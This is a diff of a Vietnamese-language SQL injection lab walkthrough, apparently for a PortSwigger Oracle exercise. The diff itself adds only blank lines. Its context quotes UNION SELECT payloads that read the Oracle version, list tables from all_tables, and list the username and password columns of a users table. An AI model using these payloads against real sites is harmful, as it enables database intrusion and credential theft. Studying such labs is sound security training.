@@ -14,6 +14,7 @@ Xác định phiên bản: **' UNION SELECT banner,NULL FROM v$version--**
 List ra toàn bộ tên database Oracle từ [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet): **SELECT * FROM all_tables**
 
 Tương tự Oracle cũng có trường **table_name** để áp dụng vào: **' UNION SELECT table_name,NULL FROM all_tables--**
+
 Trong đây sẽ có 1 bảng là **USERS_XEOUJT**, chúng ta sẽ tiến hành select ra các trường có trong bảng này.
 
 
@@ -24,6 +25,7 @@ Câu query lấy ra tất cả các trường trong Oracle:
 
 Vì thế câu query inject vào sẽ là 
 > **' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_XEOUJT'--**
+
 Ta sẽ thu được 2 columns là **PASSWORD_KCZZXF** và **USERNAME_LDDGDO**
 
 ![](/imgs/SQL-Injection/31.png?raw=true)
